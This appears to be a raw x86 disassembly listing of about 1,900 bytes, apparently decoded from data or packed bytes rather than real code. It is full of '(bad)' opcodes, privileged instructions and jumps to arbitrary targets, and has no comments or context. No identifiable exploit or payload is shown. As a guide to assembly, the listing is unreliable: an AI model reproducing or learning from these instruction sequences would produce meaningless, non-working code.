  414c9f:	in     eax,0xd4
  414ca1:	popf   
  414ca2:	mov    ecx,0x82229697
  414ca7:	inc    esp
  414ca8:	popa   
  414ca9:	mov    ebx,0x14da1779
  414cae:	pop    ss
  414caf:	push   ebx
  414cb0:	addr16 ret 
  414cb2:	push   esp
  414cb3:	fwait
  414cb4:	cmp    esp,DWORD PTR [ecx-0x36cd432a]
  414cba:	mov    BYTE PTR [edi-0xfd8da19],dl
  414cc0:	dec    eax
  414cc1:	fcos   
  414cc3:	ins    BYTE PTR es:[edi],dx
  414cc4:	jae    0x414cd2
  414cc6:	mov    WORD PTR [ecx],ds
  414cc8:	push   esp
  414cc9:	ss hlt 
  414ccb:	fcmovne st,st(5)
  414ccd:	mov    dh,0xbb
  414ccf:	adc    DWORD PTR [ecx+0x7d],ecx
  414cd2:	sar    DWORD PTR [esi-0x4916ed21],1
  414cd8:	ror    edx,cl
  414cda:	(bad)  
  414cdb:	loop   0x414c82
  414cdd:	fimul  DWORD PTR [edx+ebx*2+0x123cc67c]
  414ce4:	icebp  
  414ce5:	hlt    
  414ce6:	loope  0x414d26
  414ce8:	push   ss
  414ce9:	adc    eax,0x9bc4d5ec
  414cee:	dec    esi
  414cef:	outs   dx,DWORD PTR ds:[esi]
  414cf0:	dec    esp
  414cf1:	adc    eax,0x2b8998c9
  414cf6:	cmp    cl,al
  414cf8:	cmp    eax,0x11c9fdbc
  414cfd:	and    al,0xf6
  414cff:	cmc    
  414d00:	and    ah,BYTE PTR [ebp-0x2516bb47]
  414d06:	mov    eax,ds:0x8118081b
  414d0b:	les    esp,FWORD PTR [eax-0x4a]
  414d0e:	xlat   BYTE PTR ds:[ebx]
  414d0f:	arpl   WORD PTR [ecx-0x68da8b18],bx
  414d15:	std    
  414d16:	xchg   BYTE PTR [eax+0x5d],dh
  414d19:	sahf   
  414d1a:	push   esp
  414d1b:	or     cl,BYTE PTR [ecx]
  414d1d:	retf   
  414d1e:	mov    BYTE PTR [eax+0x603f1169],al
  414d24:	pop    edi
  414d25:	dec    eax
  414d26:	pop    ebp
  414d27:	(bad)  
  414d28:	idiv   BYTE PTR [edi-0x58]
  414d2b:	add    eax,0x2f9041a6
  414d30:	xlat   BYTE PTR ds:[ebx]
  414d31:	cmp    bl,BYTE PTR [ecx]
  414d33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d34:	mov    ebx,0x25e136b6
  414d39:	xor    al,0x71
  414d3b:	inc    edi
  414d3c:	(bad)  
  414d3d:	into   
  414d3e:	push   es
  414d3f:	cmc    
  414d40:	dec    esi
  414d41:	bound  esi,QWORD PTR [ebx+ecx*1-0x43c81ac4]
  414d48:	test   edx,0x984354b7
  414d4e:	test   DWORD PTR [ebx-0x30b93382],eax
  414d54:	push   ds
  414d55:	lea    esp,[ecx-0x42]
  414d58:	ss int3 
  414d5a:	jns    0x414ce9
  414d5c:	in     eax,0x25
  414d5e:	or     al,0x61
  414d60:	shl    esi,0xce
  414d63:	jae    0x414d7a
  414d65:	pop    esp
  414d66:	mov    al,0xe9
  414d68:	inc    ecx
  414d69:	dec    edi
  414d6a:	loop   0x414d64
  414d6c:	lock push ebx
  414d6e:	mov    eax,ds:0x8fd3786d
  414d73:	imul   edx,DWORD PTR [esi-0x69],0x25b75d98
  414d7a:	test   DWORD PTR es:[ecx],0xa149b01c
  414d81:	push   ecx
  414d82:	lock imul edx,DWORD PTR [eax-0x16f3d499],0x1dd5fa2f
  414d8d:	inc    edi
  414d8e:	mov    WORD PTR [esi+0x35],es
  414d91:	inc    eax
  414d92:	or     al,0xf
  414d94:	ret    0x4a6
  414d97:	fbld   TBYTE PTR [esp+edi*8+0x6b31ea04]
  414d9e:	inc    ecx
  414d9f:	aam    0x18
  414da1:	ret    
  414da2:	mov    bl,0x93
  414da4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414da5:	adc    eax,0xc42265b5
  414daa:	hlt    
  414dab:	jl     0x414d7f
  414dad:	and    DWORD PTR [edx+0x4ded3ad9],ebx
  414db3:	sar    BYTE PTR [edx-0x2b981d7c],0xe0
  414dba:	mov    ecx,0x3bd504b9
  414dbf:	(bad)  
  414dc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dc1:	xchg   esi,eax
  414dc2:	out    dx,eax
  414dc3:	cmp    BYTE PTR ds:0x2fa3650,dl
  414dc9:	je     0x414d8b
  414dcb:	and    al,0x8d
  414dcd:	jno    0x414db8
  414dcf:	es ss mov ebx,0x519106c0
  414dd6:	fninit 
  414dd8:	jb     0x414db6
  414dda:	daa    
  414ddb:	xor    edx,DWORD PTR [ebx-0x26d0e650]
  414de1:	pop    esi
  414de2:	jae    0x414d9e
  414de4:	jne    0x414dbc
  414de6:	call   0x18304e96
  414deb:	xor    al,0x6
  414ded:	test   DWORD PTR [edi+ebp*1],0x40b22cb7
  414df4:	cli    
  414df5:	or     DWORD PTR ds:0x64b8765,eax
  414dfb:	jp     0x414de7
  414dfd:	nop
  414dfe:	mov    ah,BYTE PTR [ebx+0x4f]
  414e01:	dec    ecx
  414e02:	mov    esi,?
  414e04:	xor    esi,edi
  414e06:	push   DWORD PTR [esi+0x248fa8d0]
  414e0c:	stc    
  414e0d:	aas    
  414e0e:	and    DWORD PTR ds:[edx+eax*1+0x7ecbefa3],0x60
  414e17:	push   esp
  414e18:	mov    ebp,es
  414e1a:	popa   
  414e1b:	fldcw  WORD PTR [ebp+edi*4-0x4b]
  414e1f:	or     ecx,ebx
  414e21:	mov    WORD PTR [edi-0x1000bbdd],ss
  414e27:	and    ebp,esi
  414e29:	out    dx,eax
  414e2a:	lods   al,BYTE PTR ds:[esi]
  414e2b:	imul   BYTE PTR [esp+eiz*2]
  414e2e:	sbb    DWORD PTR [ebp+0x7e],esp
  414e31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e32:	nop
  414e33:	test   al,0x63
  414e35:	mov    cl,0x23
  414e37:	or     eax,0x6106bef8
  414e3c:	loopne 0x414e52
  414e3e:	(bad)  
  414e3f:	mov    ecx,esi
  414e41:	bound  edx,QWORD PTR [ecx]
  414e43:	ror    BYTE PTR [ebx+edi*2],cl
  414e46:	outs   dx,DWORD PTR ds:[esi]
  414e47:	xchg   edx,eax
  414e48:	pop    es
  414e49:	retf   
  414e4a:	xor    DWORD PTR [ebx],ebx
  414e4c:	inc    edx
  414e4d:	sti    
  414e4e:	or     bl,BYTE PTR [ebp+0x6f42964d]
  414e54:	imul   dh
  414e56:	jmp    0x414eb3
  414e58:	inc    eax
  414e59:	sbb    ah,BYTE PTR [edx+eax*2]
  414e5c:	or     al,BYTE PTR [edi]
  414e5e:	repnz mov eax,0x5b71fd21
  414e64:	push   esp
  414e65:	(bad)  
  414e66:	(bad)  
  414e67:	xor    eax,0xf0faf800
  414e6c:	lods   al,BYTE PTR ds:[esi]
  414e6d:	pop    edi
  414e6e:	sub    ecx,DWORD PTR [edx+0x1e]
  414e71:	cwde   
  414e72:	push   ss
  414e73:	retf   
  414e74:	call   0x4eca:0xa5b4e4df
  414e7b:	ficom  WORD PTR [edx+0xd3f746]
  414e81:	jae    0x414ec7
  414e83:	rol    DWORD PTR [edi-0x5b5c0bee],cl
  414e89:	mov    DWORD PTR [edi+0x20],eax
  414e8c:	nop
  414e8d:	ret    0xd042
  414e90:	dec    ecx
  414e91:	xor    ecx,DWORD PTR [eax]
  414e93:	pop    ecx
  414e94:	fs pop edx
  414e96:	xchg   esi,eax
  414e97:	xchg   BYTE PTR [eax+0x59],cl
  414e9a:	rcl    BYTE PTR [ebx-0x33143692],1
  414ea0:	sub    DWORD PTR [edi],esi
  414ea2:	(bad)  
  414ea3:	outs   dx,BYTE PTR ds:[esi]
  414ea4:	adc    eax,DWORD PTR [ebx-0x69a1b0e0]
  414eaa:	test   eax,0x90dac5
  414eaf:	jp     0x414e6a
  414eb1:	mov    ebp,0xf9ad980
  414eb6:	cli    
  414eb7:	mov    al,ds:0x2de0f503
  414ebc:	js     0x414e6e
  414ebe:	(bad)
  414ec2:	mov    esi,0x89d8f503
  414ec7:	retf   0xc8db
  414eca:	call   0xbd066abd
  414ecf:	cmp    DWORD PTR [eax+0x10],0x24
  414ed3:	dec    edi
  414ed4:	mov    ecx,0x5b6706fc
  414ed9:	sbb    ebp,DWORD PTR [ebx]
  414edb:	aad    0x3d
  414edd:	jecxz  0x414edd
  414edf:	push   cs
  414ee0:	daa    
  414ee1:	stos   DWORD PTR es:[edi],eax
  414ee2:	add    ecx,DWORD PTR [ecx-0x3d]
  414ee5:	sub    BYTE PTR [esi+0x18],0x3b
  414ee9:	(bad)  
  414eea:	or     ch,bl
  414eec:	data16 or bh,BYTE PTR [esi+ebp*8]
  414ef0:	fisub  DWORD PTR [ebx]
  414ef2:	xor    BYTE PTR [eax+0x2a6bf7bc],dl
  414ef8:	sbb    BYTE PTR [eax-0x58252513],dh
  414efe:	push   edx
  414eff:	xchg   ecx,eax
  414f00:	push   eax
  414f01:	(bad)  
  414f02:	pop    ebx
  414f03:	jbe    0x414f4d
  414f05:	fadd   DWORD PTR [edx]
  414f07:	shl    BYTE PTR [eax-0x6495314d],cl
  414f0d:	xchg   ecx,eax
  414f0e:	xchg   ecx,eax
  414f0f:	adc    ah,BYTE PTR [edx-0x3b34c546]
  414f15:	mov    ebp,0x6a117bd8
  414f1a:	cmp    al,0x8f
  414f1c:	pop    ds
  414f1d:	popa   
  414f1e:	test   al,0xfb
  414f20:	test   ebx,edi
  414f22:	adc    BYTE PTR [edx-0x14],dh
  414f25:	jecxz  0x414f3e
  414f27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f28:	(bad)  
  414f29:	out    0x8,al
  414f2b:	xlat   BYTE PTR ds:[ebx]
  414f2c:	or     eax,0x88685f2b
  414f31:	pop    eax
  414f32:	dec    esi
  414f33:	out    0x98,al
  414f35:	push   cs
  414f36:	fs dec eax
  414f38:	cmp    DWORD PTR [eax+0x5a5578dc],ebp
  414f3e:	fdiv   QWORD PTR [esi+0x5d065009]
  414f44:	mov    DWORD PTR [esi-0x6e23fdd2],ebp
  414f4a:	(bad)  
  414f4c:	scas   al,BYTE PTR es:[edi]
  414f4d:	xlat   BYTE PTR ds:[ebx]
  414f4e:	js     0x414ee0
  414f50:	jp     0x414f5a
  414f52:	cmp    eax,DWORD PTR [ecx+0x2d]
  414f55:	sub    al,0x4f
  414f57:	cs (bad) 
  414f59:	in     eax,0xf8
  414f5b:	dec    esi
  414f5c:	xchg   edi,eax
  414f5d:	add    BYTE PTR [eax],ah
  414f5f:	cmc    
  414f60:	sub    dl,BYTE PTR [ecx+0x4d9abfa6]
  414f66:	aas    
  414f67:	add    eax,0xa62ab191
  414f6c:	(bad)  
  414f6d:	cmc    
  414f6e:	jo     0x414f70
  414f70:	lahf   
  414f71:	sar    edi,1
  414f73:	or     DWORD PTR [edi+0x6eb9264d],ebx
  414f79:	and    DWORD PTR [eax-0x29],esi
  414f7c:	cmp    DWORD PTR [edi-0x7a],0xd17c8c47
  414f83:	icebp  
  414f84:	fdiv   QWORD PTR [edx+0x17]
  414f87:	leave  
  414f88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f89:	inc    ebp
  414f8a:	frstor [ebx+edi*8+0x23]
  414f8e:	xor    DWORD PTR [edi-0x56],0x69e2cde9
  414f95:	cmp    DWORD PTR [edi],ecx
  414f97:	xor    DWORD PTR [ecx+0x5b],0xb73e33c2
  414f9e:	xlat   BYTE PTR ds:[ebx]
  414f9f:	cmp    esi,DWORD PTR [ebp+0x42f7455c]
  414fa5:	jno    0x41501a
  414fa7:	pop    ss
  414fa8:	add    BYTE PTR [esi+eax*1-0x37196822],0x89
  414fb0:	call   0x57c5:0xddc3b5d8
  414fb7:	fcmovne st,st(4)
  414fb9:	in     al,0x78
  414fbb:	fcomp  DWORD PTR [eax-0xd]
  414fbe:	aam    0x7
  414fc0:	mov    al,ds:0xd2866f17
  414fc5:	inc    eax
  414fc6:	in     al,dx
  414fc7:	mov    dl,0x78
  414fc9:	pop    eax
  414fca:	repz add al,0xb9
  414fcd:	jle    0x414fdb
  414fcf:	jmp    0xea6d:0x909be753
  414fd6:	pop    edx
  414fd7:	fwait
  414fd8:	je     0x415002
  414fda:	jae    0x41502a
  414fdc:	mov    al,al
  414fde:	mov    bh,0x91
  414fe0:	and    al,0xdd
  414fe2:	cdq    
  414fe3:	mov    ah,0xe2
  414fe5:	xor    eax,DWORD PTR [ecx]
  414fe7:	into   
  414fe8:	mov    ecx,0x3c58b5a6
  414fed:	fidivr DWORD PTR [edx+eax*8-0x6b3d2987]
  414ff4:	aas    
  414ff5:	(bad)  
  414ff6:	pushf  
  414ff7:	jecxz  0x414fdc
  414ff9:	or     eax,0x2303daed
  414ffe:	hlt    
  414fff:	add    esi,ebx
  415001:	xor    BYTE PTR [esp+ebx*8-0x6b],cl
  415005:	mov    ah,0x6c
  415007:	push   es
  415008:	jp     0x414f92
  41500a:	or     DWORD PTR [ecx+ebx*1+0x492c7429],ecx
  415011:	and    esp,eax
  415013:	test   ch,cl
  415015:	lock scas eax,DWORD PTR es:[edi]
  415017:	mov    dh,0xd5
  415019:	add    ebp,ebp
  41501b:	pop    ds
  41501c:	pop    edx
  41501d:	retf   0x1867
  415020:	pusha  
  415021:	je     0x41509e
  415023:	out    dx,eax
  415024:	(bad)  
  415025:	lods   eax,DWORD PTR ds:[esi]
  415026:	enter  0x33d2,0x27
  41502a:	ficomp WORD PTR [ebx+0x58]
  41502d:	shl    DWORD PTR [ebp-0x5dbfac3f],0xba
  415034:	pop    es
  415035:	push   ecx
  415036:	push   0xe6b8379b
  41503b:	fnsave [edi+0x4c]
  41503e:	jmp    0x9e8115e
  415043:	inc    ebp
  415044:	hlt    
  415045:	(bad)  
  415047:	enter  0x9ee5,0x69
  41504b:	rcl    BYTE PTR [edx-0x45],cl
  41504e:	push   cs
  41504f:	dec    ebx
  415050:	push   eax
  415051:	lahf   
  415052:	push   edx
  415053:	scas   eax,DWORD PTR es:[edi]
  415054:	cwde   
  415055:	push   0x44e69f43
  41505a:	ja     0x415052
  41505c:	sub    esi,0xebb9ca0b
  415062:	int    0xf9
  415064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415065:	push   esi
  415066:	popf   
  415067:	add    BYTE PTR [ebp+0x0],ch
  41506a:	mov    ebx,DWORD PTR [eax-0x1d]
  41506d:	and    al,0x4
  41506f:	push   es
  415070:	ins    DWORD PTR es:[edi],dx
  415071:	shl    BYTE PTR [ecx-0x4b],1
  415074:	xor    al,0x16
  415076:	add    al,0x30
  415078:	and    al,0x63
  41507a:	dec    ebp
  41507b:	adc    bl,BYTE PTR [edx]
  41507d:	mov    ebx,0x27d87bcc
  415082:	mov    edx,0xdb3e76ce
  415087:	sbb    esi,ecx
  415089:	xchg   ebp,eax
  41508a:	cmp    edx,ecx
  41508c:	mov    al,ds:0x204cfd9a
  415091:	icebp  
  415092:	xor    cl,BYTE PTR [eax]
  415094:	repz jbe 0x41501c
  415097:	imul   esp,DWORD PTR [eax-0x72],0xe2e9217
  41509e:	sbb    BYTE PTR [esp+ecx*1+0x34],bh
  4150a2:	popf   
  4150a3:	fild   WORD PTR [ebp+edx*4+0x33]
  4150a7:	inc    edi
  4150a8:	cld    
  4150a9:	mov    al,ds:0x5e6a8e93
  4150ae:	cli    
  4150af:	adc    BYTE PTR [edx],cl
  4150b1:	sbb    bl,0x2d
  4150b4:	and    al,0x9e
  4150b6:	shl    esi,0x3e
  4150b9:	mov    cl,0xb5
  4150bb:	pop    edi
  4150bc:	(bad)  
  4150bd:	out    0x4e,eax
  4150bf:	(bad)  
  4150c0:	enter  0xb60,0x2
  4150c4:	fcom   QWORD PTR [edx*1-0x51581b11]
  4150cb:	xlat   BYTE PTR fs:[ebx]
  4150cd:	loope  0x415139
  4150cf:	repnz (bad)
  4150d2:	fld    TBYTE PTR [edi]
  4150d4:	lods   al,BYTE PTR gs:[esi]
  4150d6:	xlat   BYTE PTR ds:[ebx]
  4150d7:	push   edi
  4150d8:	je     0x4150d7
  4150da:	cs mov dl,0x7d
  4150dd:	pusha  
  4150de:	add    ch,cl
  4150e0:	int    0xc4
  4150e2:	sbb    esp,DWORD PTR [eax-0x15551b93]
  4150e8:	mov    esi,0xe1ceb9c0
  4150ed:	fcom   DWORD PTR [edx]
  4150ef:	test   BYTE PTR [ebx-0x6ac2ad13],bh
  4150f5:	retf   
  4150f6:	retf   0xb81e
  4150f9:	sbb    eax,0x64461690
  4150fe:	js     0x415105
  415100:	inc    edi
  415101:	mov    WORD PTR [edx],?
  415103:	adc    eax,0xca8a90
  415108:	sbb    al,0xd8
  41510a:	jg     0x4150ef
  41510c:	pop    ds
  41510d:	adc    DWORD PTR [ecx-0x3c5f2171],edi
  415113:	pop    ss
  415114:	outs   dx,DWORD PTR ds:[esi]
  415115:	loop   0x415165
  415117:	inc    ebx
  415118:	fcmovnb st,st(6)
  41511a:	or     eax,0x9bfbb117
  41511f:	xchg   edx,eax
  415120:	popf   
  415121:	mov    cl,0x36
  415123:	xchg   ebp,eax
  415124:	inc    ecx
  415125:	pop    ds
  415126:	aas    
  415127:	(bad)  
  415128:	sub    ah,ah
  41512a:	mov    ds:0x7390ddcb,eax
  41512f:	push   0xb47dd721
  415134:	xor    BYTE PTR [edx-0x71],bh
  415137:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415138:	inc    esp
  415139:	dec    esp
  41513a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41513b:	jmp    0x415123
  41513d:	leave  
  41513e:	out    0xd0,al
  415140:	lea    esi,[esi-0x4c]
  415143:	(bad)  
  415144:	or     DWORD PTR [ebp+0x5b],0x40755021
  41514b:	jo     0x4150d8
  41514d:	das    
  41514e:	stos   BYTE PTR es:[edi],al
  41514f:	(bad)  
  415150:	mov    DWORD PTR [eax],eax
  415152:	mov    ebp,0x9beb907e
  415157:	fsub   DWORD PTR [di+0x17]
  41515b:	imul   ebx,DWORD PTR [edx+0x5299aa77],0xe64654fd
  415165:	pop    edi
  415166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415167:	maskmovq mm6,mm5
  41516a:	pop    esp
  41516b:	loope  0x4151df
  41516d:	and    esp,DWORD PTR [eax-0x69162a60]
  415173:	test   eax,0xc2bec3b5
  415178:	call   0xf744747b
  41517d:	cmc    
  41517e:	mov    eax,ds:0xc8d89331
  415183:	nop
  415184:	dec    ebx
  415185:	or     ch,BYTE PTR [eax]
  415187:	test   BYTE PTR [edx+eiz*8-0x1c],bh
  41518b:	push   edi
  41518c:	inc    edi
  41518d:	(bad)  
  41518e:	ds int3 
  415190:	jg     0x415115
  415192:	repnz lock mov ah,0x0
  415196:	shr    DWORD PTR [edx-0x14],0x88
  41519a:	sbb    ebp,DWORD PTR [ecx+0x8]
  41519d:	in     al,dx
  41519e:	out    dx,eax
  41519f:	pushf  
  4151a0:	mov    ch,0x2
  4151a2:	xchg   DWORD PTR [ebp+0x61c22c0b],eax
  4151a8:	out    dx,eax
  4151a9:	inc    edi
  4151aa:	sub    ebx,DWORD PTR [edi+0x66]
  4151ad:	lea    ebp,[edi]
  4151af:	mov    es,WORD PTR [eax]
  4151b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151b2:	push   ecx
  4151b3:	xchg   edx,eax
  4151b4:	or     DWORD PTR [edi],0x5a862dfb
  4151ba:	nop
  4151bb:	outs   dx,BYTE PTR ds:[esi]
  4151bc:	mov    al,ds:0x4c65af52
  4151c1:	inc    edx
  4151c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151c3:	and    ah,BYTE PTR [ebx]
  4151c5:	jns    0x41523d
  4151c7:	and    bh,ah
  4151c9:	fiadd  WORD PTR [edx-0x56]
  4151cc:	mov    ebp,0x394e453b
  4151d1:	aas    
  4151d2:	xor    DWORD PTR [ebx+0x23],ebp
  4151d5:	or     dl,dh
  4151d7:	jle    0x4151fe
  4151d9:	jmp    0x4151ba
  4151db:	mov    ecx,0xc79b6b4d
  4151e0:	push   es
  4151e1:	aaa    
  4151e2:	data16 stos BYTE PTR es:[edi],al
  4151e4:	pushf  
  4151e5:	stc    
  4151e6:	out    0xb9,eax
  4151e8:	push   es
  4151e9:	icebp  
  4151ea:	iret   
  4151eb:	xchg   edx,eax
  4151ec:	les    edi,FWORD PTR [ecx]
  4151ee:	pop    ss
  4151ef:	sub    eax,0x3e13e519
  4151f4:	jns    0x415203
  4151f6:	or     dh,BYTE PTR [ebx]
  4151f8:	xor    esp,ebp
  4151fa:	(bad)  [eax]
  4151fc:	mov    ?,WORD PTR [esi]
  4151fe:	enter  0x919c,0x80
  415202:	mov    ch,0x80
  415204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415205:	jp     0x415270
  415207:	out    0xd6,eax
  415209:	mov    dh,0x46
  41520b:	add    DWORD PTR [ecx],ecx
  41520d:	fimul  WORD PTR ds:0x9f80e9cb
  415213:	fadd   st,st(0)
  415215:	pusha  
  415216:	fnstenv [esi]
  415218:	xchg   ebx,eax
  415219:	inc    esp
  41521a:	push   ecx
  41521b:	imul   esp,DWORD PTR [edi+ebp*2],0xd95d9c06
  415222:	stos   DWORD PTR es:[edi],eax
  415223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415224:	push   cs
  415225:	adc    edi,edi
  415227:	sub    al,0x9b
  415229:	mov    ebp,DWORD PTR ds:0x733a42b7
  41522f:	or     ah,BYTE PTR [edx+0x2f]
  415232:	out    dx,eax
  415233:	les    ebx,FWORD PTR [eax]
  415235:	xor    eax,0xc4ec0b03
  41523a:	and    cl,BYTE PTR [ebx]
  41523c:	push   ebx
  41523d:	pop    es
  41523e:	pop    esi
  41523f:	stos   DWORD PTR es:[edi],eax
  415240:	inc    esp
  415241:	jo     0x415279
  415243:	sub    eax,0x6dcca863
  415248:	icebp  
  415249:	ss xchg esp,eax
  41524b:	mov    eax,ds:0x4920d18a
  415250:	shr    ecx,0x1b
  415253:	mov    esp,0xcbb3e8ef
  415258:	mov    BYTE PTR [eax],ch
  41525a:	jecxz  0x41520a
  41525c:	mov    esi,0x87b7453f
  415261:	sub    BYTE PTR [esi],cl
  415263:	cmc    
  415264:	sbb    DWORD PTR [ebx+0x5860f9a2],0xffffffbd
  41526b:	ins    DWORD PTR es:[edi],dx
  41526c:	cmp    bl,BYTE PTR [edi]
  41526e:	jmp    0xc5d9:0x2235db7d
  415275:	call   0x5765:0xabca04c2
  41527c:	sub    al,0x11
  41527e:	test   BYTE PTR ss:[eax-0x45f135f7],bl
  415285:	aas    
  415286:	out    0x55,eax
  415288:	mov    edx,0x7dea1f31
  41528d:	nop    DWORD PTR [edi]
  415290:	mov    bl,0xf6
  415292:	adc    DWORD PTR [edi+edx*8-0x3b9d6a2c],0x62
  41529a:	lods   eax,DWORD PTR ds:[esi]
  41529b:	jle    0x4152b1
  41529d:	mov    ch,0xef
  41529f:	xchg   BYTE PTR [edx-0x24],dl
  4152a2:	jp     0x4152b0
  4152a4:	fstp   TBYTE PTR [ebp+0x7bad456a]
  4152aa:	popf   
  4152ab:	out    dx,eax
  4152ac:	out    dx,al
  4152ad:	xchg   DWORD PTR [esi-0x63],esp
  4152b0:	cli    
  4152b1:	jge    0x4152e0
  4152b3:	mov    al,0xd
  4152b5:	add    BYTE PTR [eax+eax*1],dh
  4152b8:	ins    DWORD PTR es:[edi],dx
  4152b9:	outs   dx,DWORD PTR ds:[esi]
  4152ba:	fbstp  TBYTE PTR [edx]
  4152bc:	les    ecx,FWORD PTR [esi+0x484a1c9b]
  4152c2:	mov    ds:0x104d7f3c,al
  4152c7:	add    eax,0x8a4ba559
  4152cc:	push   esi
  4152cd:	lods   eax,DWORD PTR ds:[esi]
  4152ce:	mov    cl,0x10
  4152d0:	push   edi
  4152d1:	adc    eax,0x75ad4a9d
  4152d6:	das    
  4152d7:	xor    BYTE PTR [edi],bh
  4152d9:	inc    ebp
  4152da:	add    DWORD PTR [ecx+0x2e],edx
  4152dd:	mov    al,ds:0xc4eebc05
  4152e2:	mov    dl,0x58
  4152e4:	add    eax,0x96f568c0
  4152e9:	and    cl,bh
  4152eb:	and    DWORD PTR [ecx],ecx
  4152ed:	in     eax,0x6d
  4152ef:	cdq    
  4152f0:	mov    bh,0x16
  4152f2:	mov    edi,0x569c7e13
  4152f7:	or     BYTE PTR [ecx+0xd],al
  4152fa:	jo     0x41529e
  4152fc:	xor    ebx,DWORD PTR [esi+0x48854940]
  415302:	ins    BYTE PTR es:[edi],dx
  415303:	clc    
  415304:	cwde   
  415305:	cmp    ch,BYTE PTR [ebx-0x5acbaabe]
  41530b:	int    0x4c
  41530d:	mov    BYTE PTR [edx+eax*1-0x25],0x53
  415312:	loopne 0x415337
  415314:	sub    dh,bh
  415316:	xchg   ebx,eax
  415317:	idiv   BYTE PTR [esi]
  415319:	rol    BYTE PTR [ebx],0x61
  41531c:	pushf  
  41531d:	mov    dl,0x34
  41531f:	loope  0x4152c2
  415321:	xchg   edx,esp
  415323:	inc    eax
  415324:	inc    ebx
  415325:	sbb    DWORD PTR [esi+ecx*4-0x6f],esi
  415329:	mov    esi,0xddc945a5
  41532e:	adc    DWORD PTR [edi+ebp*8],esp
  415331:	sbb    BYTE PTR [esi],0xcc
  415334:	sub    DWORD PTR [edx+ebx*2-0x4fdb6e10],esp
  41533b:	aad    0x80
  41533d:	pop    eax
  41533e:	shr    BYTE PTR [edi+0x87dde9d],1
  415344:	in     eax,dx
  415345:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415346:	fdiv   DWORD PTR [edi]
  415348:	mov    ch,0xfb
  41534a:	inc    esp
  41534b:	sbb    edx,DWORD PTR [esi-0x36961dff]
  415351:	cmp    DWORD PTR [esi-0x34d1ef60],edx
  415357:	jns    0x4152db
  415359:	or     al,0x7f
  41535b:	pop    eax
  41535c:	mov    dl,0xa0
  41535e:	jno    0x415393
  415360:	(bad)  
  415361:	hlt    
  415362:	out    dx,eax
  415363:	sahf   
  415364:	inc    eax
  415365:	push   ebp
  415366:	or     al,0xec
  415368:	fwait
  415369:	adc    BYTE PTR [ebx+0x223bbebf],dl
  41536f:	repnz popa 
  415371:	adc    BYTE PTR [ebx],bl
  415373:	add    esp,eax
  415375:	inc    eax
  415376:	xchg   esi,eax
  415377:	je     0x41532d
  415379:	push   ds
  41537a:	sbb    bh,bh
  41537c:	mov    ebx,0x8afe2578
  415381:	xor    al,0x7b
  415383:	repnz sub dh,BYTE PTR [esi+0x56f2554f]
  41538a:	sbb    ebx,DWORD PTR [eax-0x79]
  41538d:	pushf  
  41538e:	sub    BYTE PTR [eax-0x6ddbbd7d],cl
  415394:	xchg   esi,eax
  415395:	and    eax,0x56f4019e
  41539a:	int3   
  41539b:	fdiv   QWORD PTR [esi-0x72c826fb]
  4153a1:	cmp    dl,cl
  4153a3:	sahf   
  4153a4:	mov    dl,0xc1
  4153a6:	cmp    cl,dh
  4153a8:	stos   DWORD PTR es:[edi],eax
  4153a9:	cmp    edx,ecx
  4153ab:	test   al,0x54
  4153ad:	arpl   WORD PTR [ecx+0x46],cx
  4153b0:	xchg   edi,eax
  4153b1:	jg     0x415353
  4153b3:	lods   eax,DWORD PTR ds:[esi]
  4153b4:	sub    BYTE PTR [eax],ah
  4153b6:	nop
  4153b7:	push   cs
  4153b8:	cmp    edi,DWORD PTR [edi-0x651299b3]
  4153be:	adc    DWORD PTR [edx-0x6f],0xc885e560
  4153c5:	mov    dh,0x4
  4153c7:	xor    DWORD PTR [edi-0x39],0x8f2bc2a1
  4153ce:	sub    eax,0x392ee6b6
  4153d3:	mov    ah,0xc0
  4153d5:	add    ah,0x6
  4153d8:	sahf   
  4153d9:	div    bl
  4153db:	test   BYTE PTR [esi-0x40],dh
  4153de:	or     ah,cl
  4153e0:	ins    BYTE PTR es:[edi],dx
  4153e1:	pusha  
  4153e2:	cmp    eax,0x1e78e83f
  4153e7:	nop
  4153e8:	ret    0xd73b
  4153eb:	cmp    cl,BYTE PTR [ebp+0x44]
  4153ee:	dec    ecx
  4153ef:	push   es
  4153f0:	leave  
  4153f1:	stos   DWORD PTR es:[edi],eax
  4153f2:	call   0x7d24:0x716f7071
  4153f9:	dec    edi
  4153fa:	cld    
  4153fb:	lea    edx,[ecx]
  4153fd:	pop    esi
  4153fe:	in     eax,0x3e
  415400:	and    cl,BYTE PTR [eax-0x1cab064c]
  415406:	mov    cl,0xf4
  415408:	je     0x4153a2
  41540a:	adc    bh,BYTE PTR [edx-0x22aa3dd2]
  415410:	mov    eax,ds:0xbb3d56cb
  415415:	mov    eax,0x3c3da352
  41541a:	xchg   edi,eax
  41541b:	mov    ecx,0x99bbb1be
  415420:	ins    DWORD PTR es:[edi],dx
  415421:	mov    gs,WORD PTR [eax+edi*2-0x31]
  415425:	inc    edi
  415426:	add    DWORD PTR [edx+0x3c332f8e],0x948afb37
  415430:	inc    ebx
  415431:	popa   
  415432:	add    eax,0xb1c81873
  415437:	loope  0x41548a
  415439:	loop   0x41544f
  41543b:	mov    ah,0x7a
  41543d:	adc    al,BYTE PTR [edi-0x50e357a2]
  415443:	ds ins DWORD PTR es:[edi],dx
  415445:	pop    es
  415446:	(bad)  [eax+eiz*2]
  415449:	mov    ebp,0xaeb990e4
  41544e:	sbb    DWORD PTR [ebp-0x4d407ead],esi
  415454:	mov    esp,0xd7a00f76
  415459:	pop    es
  41545a:	lods   eax,DWORD PTR ds:[esi]
  41545b:	add    edx,DWORD PTR [eax-0x47cf3392]
  415461:	push   ecx
  415462:	scas   al,BYTE PTR es:[edi]
  415463:	idiv   BYTE PTR [edx+0x3d]
  415466:	pop    ds
